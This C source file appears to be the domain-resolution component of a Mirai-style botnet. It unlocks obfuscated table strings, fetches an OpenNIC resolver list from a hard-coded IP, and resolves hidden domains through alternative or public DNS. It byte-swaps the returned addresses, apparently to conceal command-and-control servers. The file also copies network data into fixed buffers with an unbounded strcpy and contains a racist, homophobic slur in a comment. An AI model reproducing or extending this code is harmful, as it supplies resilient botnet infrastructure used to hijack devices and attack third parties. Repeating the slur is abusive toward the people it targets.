#define _GNU_SOURCE

#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <fcntl.h>
#include <signal.h>

#include "dbg.h"
#include "bool.h"
#include "util.h"
#include "rand.h"
#include "table.h"
#include "resolve.h"

/*
struct dnshdr {
    uint16_t id, opts, qdcount, ancount, nscount, arcount;
};

struct dns_question {
    uint16_t qtype, qclass;
};
*/

struct __attribute__((packed)) dnshdr {
    uint16_t id;
    uint16_t opts;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

struct __attribute__((packed)) dns_question {
    uint16_t qtype;
    uint16_t qclass;
};

struct dns_resource {
    uint16_t type, _class;
    uint32_t ttl;
    uint16_t data_len;
} __attribute__((packed));

static BOOL opennic_fetch = FALSE;
static int opennic_fetch_count = 0;
static char opennic_fetch_ips[32][16];


static void fetch_opennic_dns(void) {

    int fd = socket(AF_INET, SOCK_STREAM, 0);

    if (fd == -1) {
        DEBUG_PRINT("[fetch_opennic_dns] socket() failed\n");
        return;
    }

    struct timeval tv = {
        .tv_sec = 1,
        .tv_usec = 0
    };

    if (setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)) == -1 || setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) == -1) {
        DEBUG_PRINT("[resolve_domain] setsockopt() failed\n");
        goto label;
    }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(80),
        .sin_addr.s_addr = INET_ADDR(116, 203, 98, 109)
    };

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        DEBUG_PRINT("[fetch_opennic_dns] connect() failed\n");
        goto label;
    }

    table_unlock_val(TABLE_OPENNIC_RESOLVE);
    if (send(fd, table[TABLE_OPENNIC_RESOLVE].str, 67, MSG_NOSIGNAL) == -1) {
        table_lock_val(TABLE_OPENNIC_RESOLVE);
        DEBUG_PRINT("[fetch_opennic_dns] send() failed\n");
        goto label;
    }
    table_lock_val(TABLE_OPENNIC_RESOLVE);

    int header_parser = 0;
    BOOL found_header = FALSE;

    while (TRUE) {
        char c;

        if (read(fd, &c, 1) <= 0)
            break;

        header_parser = (header_parser << 8) | c;

        if (header_parser == 0x0d0a0d0a) {
            found_header = TRUE;
            break;
        }
    }

    if (!found_header) {
        DEBUG_PRINT("[fetch_opennic_dns] failed to parse header\n");
        goto label;
    }

    int len;
    char rcvbuf[512] = {0};

    if ((len = recv(fd, rcvbuf, sizeof(rcvbuf), MSG_NOSIGNAL)) <= 0) {
        DEBUG_PRINT("[fetch_opennic_dns] recv() failed\n");
        goto label;
    }

    char *token = strtok(rcvbuf, "\n");

    while (token) {
        strcpy(opennic_fetch_ips[opennic_fetch_count++], token);
        token = strtok(NULL, "\n");
    }

#ifdef KDEBUG
    DEBUG_PRINT("[fetch_opennic_dns] opennic_fetch_count: (\'%d\')\n", opennic_fetch_count);

    for (int i = 0; i < opennic_fetch_count; i++)
        DEBUG_PRINT("[fetch_opennic_dns] opennic_fetch_ips[%d]: (\"%s\")\n", i, opennic_fetch_ips[i]);
#endif

label:
    close(fd);
}

static uint32_t rand_opennic_dns(void) {

    int i = rand_next() % 17;

    switch (i) {
        case 0:
            return INET_ADDR(94, 247, 43, 254); // 94.247.43.254, ethservices, Germany
        case 1:
            return INET_ADDR(195, 10, 195, 195); // 195.10.195.195, ethservices, Germany
        case 2:
            return INET_ADDR(152, 53, 15, 127); // 152.53.15.127, mistersixt, Germany
        case 3:
            return INET_ADDR(194, 36, 144, 87); // 194.36.144.87, mistersixt, Germany
        case 4:
            return INET_ADDR(178, 254, 22, 166); // 178.254.22.166, opennameserver.org, Germany
        case 5:
            return INET_ADDR(81, 169, 136, 222); // 81.169.136.222, opennameserver.org, Germany
        case 6:
            return INET_ADDR(103, 1, 206, 179); // 103.1.206.179, slowbro, Australia
        case 7:
            return INET_ADDR(168, 138, 12, 137); // 168.138.12.137, slowbro, Australia
        case 8:
            return INET_ADDR(51, 158, 108, 203); // 51.158.108.203, EricL, France
        case 9:
            return INET_ADDR(138, 197, 140, 189); // 138.197.140.18, Purple Night Studios, Canada
        case 10:
            return INET_ADDR(168, 235, 111, 72); // 168.235.111.72, sev, US
        case 11:
            return INET_ADDR(162, 243, 19, 47); // 162.243.19.47, MeadMA, US
        case 12:
            return INET_ADDR(38,103,195,4); // 38.103.195.4, August, Canada
        case 13:
            return INET_ADDR(70, 34, 254, 19); // 70.34.254.19, pangea, Poland
        case 14:
            return INET_ADDR(51, 77, 149, 139); // 51.77.149.139, megan, France
        case 15:
            return INET_ADDR(65, 21, 1, 106); // 65.21.1.106, pangea, Finland
        case 16:
            return INET_ADDR(37, 252, 191, 197); // 37.252.191.197, schmaller, Austria
    }

    return 0;
}

static uint32_t rand_opennic(void) {

    int i = rand_next() % 2;

    switch (i) {
        case 0:
            return inet_addr(opennic_fetch_ips[rand_next() % opennic_fetch_count]);
        case 1:
            return rand_opennic_dns();
    }

    return 0;
}

static uint32_t rand_dns(void) {

    int i = rand_next() % 5;

    switch (i) {
        case 0:
            return INET_ADDR(8, 8, 8, 8); // Google
        case 1:
            return INET_ADDR(1, 1, 1, 1); // Cloudflare
        case 2:
            return INET_ADDR(208, 67, 222, 222); // OpenDNS
        case 3:
            return INET_ADDR(9, 9, 9, 9); // Quad9
        case 4:
            return INET_ADDR(77, 88, 8, 8); // Yandex
    }

    return 0;
}

static void resolv_domain_to_hostname(char *dst_hostname, char *src_domain) {

    int len = strlen(src_domain) + 1;
    char *lbl = dst_hostname, *dst_pos = dst_hostname + 1;
    uint8_t curr_len = 0;

    while (len--) {
        char c = *src_domain++;

        if (c == '.' || !c) {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        }
        else {
            curr_len++;
            *dst_pos++ = c;
        }
    }

    *dst_pos = 0;
}

static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count) {

    unsigned int jumped = 0, offset;
    *count = 1;

    while (*reader) {
        if (*reader >= 192) {
            offset = (*reader) * 256 + *(reader + 1) - 49152;
            reader = buffer + offset - 1;
            jumped = 1;
        }

        reader += 1;
        
        if (!jumped)
            *count += 1;
    }

    if (jumped == 1)
        *count += 1;
}

struct dns_result resolve_domain(char *domain, BOOL opt) {

    struct dns_result result = {NULL, 0};
    
    if (!opennic_fetch_count && !opennic_fetch) {
        fetch_opennic_dns();
        opennic_fetch = TRUE;
    }

    int fd = socket(AF_INET, SOCK_DGRAM, 0);

    if (fd == -1) {
        DEBUG_PRINT("[resolve_domain] socket() failed\n");
        return result;
    }

    struct timeval tv = {
        .tv_sec = 1,
        .tv_usec = 0
    };

    if (setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)) == -1 || setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) == -1) {
        DEBUG_PRINT("[resolve_domain] setsockopt() failed\n");
        goto label;
    }

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(53),
        .sin_addr.s_addr = opt ? (opennic_fetch_count ? rand_opennic() : rand_opennic_dns()) : rand_dns()
    };

    DEBUG_PRINT("[resolve_domain] attempting to resolve domain: (\"%s\") using \"%s\" dns: (\"%s\")\n", domain, opt ? "OpenNic" : "regular", inet_ntoa((struct in_addr){(addr.sin_addr.s_addr)}));

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
        DEBUG_PRINT("[resolve_domain] connect() failed\n");
        goto label;
    }

    char query[1024] = {0}, response[1024] = {0};
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);

    resolv_domain_to_hostname(qname, domain);

    struct dns_question *dnst = (struct dns_question *)(qname + strlen(qname) + 1);
    int query_len = sizeof(struct dnshdr) + strlen(qname) + 1 + sizeof(struct dns_question);

    dnsh->id = rand_next_range(1, 65535);
    dnsh->opts = htons(1 << 8);
    dnsh->qdcount = htons(1);
    dnst->qtype = htons(1);
    dnst->qclass = htons(1);

    if (send(fd, query, query_len, MSG_NOSIGNAL) == -1) {
        DEBUG_PRINT("[resolve_domain] send() failed\n");
        goto label;
    }

    if (recvfrom(fd, response, sizeof(response), MSG_NOSIGNAL, NULL, NULL) <= 0) {
        DEBUG_PRINT("[resolve_domain] recvfrom() failed\n");
        goto label;
    }

    dnsh = (struct dnshdr *)response;
    qname = (char *)(dnsh + 1);
    dnst = (struct dns_question *)(qname + strlen(qname) + 1);

    char *name = (char *)(dnst + 1);

    int stop;
    for (unsigned int i = 0; i < ntohs(dnsh->ancount); i++) {
        resolv_skip_name((uint8_t *)name, (uint8_t *)response, &stop);
        name += stop;

        struct dns_resource *r_data = (struct dns_resource *)name;
        name += sizeof(struct dns_resource);

        if (r_data->type == htons(1) && r_data->_class == htons(1)) {
            if (ntohs(r_data->data_len) == 4) {
                uint8_t tmp_buf[4];

                for (int j = 0; j < 4; j++) {
                    tmp_buf[j] = name[j];
                }

                tmp_buf[0] = name[0] ^ name[2];
                tmp_buf[2] = name[2] ^ tmp_buf[0];
                tmp_buf[0] = tmp_buf[0] ^ tmp_buf[2];
                //you are blacker than you are gay
                tmp_buf[1] = name[1] ^ name[3];
                tmp_buf[3] = name[3] ^ tmp_buf[1];
                tmp_buf[1] = tmp_buf[1] ^ tmp_buf[3];

                uint32_t ip_addr;
                memcpy(&ip_addr, tmp_buf, 4);

                result.ips = realloc(result.ips, (result.count + 1) * sizeof(uint32_t));
                result.ips[result.count++] = ip_addr;
//                DEBUG_PRINT("[resolve_domain] Resolved: \"%s\" | result[%d]: %s\n", domain, result.count - 1, inet_ntoa((struct in_addr){(result.ips[result.count - 1])}));
            }
        }
        name += ntohs(r_data->data_len);
    }

label:
    close(fd);
    return result;
}

static struct dns_result rand_opennic_domain(void) {

    int i = rand_next() % 2;
    struct dns_result result = {NULL, 0};

    switch (i) {
        case 0:
            table_unlock_val(TABLE_OPENNIC_DOMAIN);
            result = resolve_domain(table[TABLE_OPENNIC_DOMAIN].str, TRUE);
            table_lock_val(TABLE_OPENNIC_DOMAIN);
            break;
        case 1:
            table_unlock_val(TABLE_OPENNIC_DOMAIN2);
            result = resolve_domain(table[TABLE_OPENNIC_DOMAIN2].str, TRUE);
            table_lock_val(TABLE_OPENNIC_DOMAIN2);
            break;
    }

    return result;
}

static struct dns_result rand_icann_domain(void) {

    int i = rand_next() % 2;
    struct dns_result result = {NULL, 0};

    switch (i) {
        case 0:
            table_unlock_val(TABLE_REG_DOMAIN);
            result = resolve_domain(table[TABLE_REG_DOMAIN].str, FALSE);
            table_lock_val(TABLE_REG_DOMAIN);
            break;
        case 1:
            table_unlock_val(TABLE_REG_DOMAIN2);
            result = resolve_domain(table[TABLE_REG_DOMAIN2].str, FALSE);
            table_lock_val(TABLE_REG_DOMAIN2);
            break;
    }

    return result;
}

struct dns_result rand_addr(void) {

    int i = rand_next() % 2;
    struct dns_result result = {NULL, 0};

    switch (i) {
        case 0:
            result = rand_opennic_domain();
            break;
        case 1:
            result = rand_icann_domain();
            break;
    }

    return result;
}

void free_dns_result(struct dns_result *result) {
    free(result->ips);
    result->ips = NULL;
    result->count = 0;
}
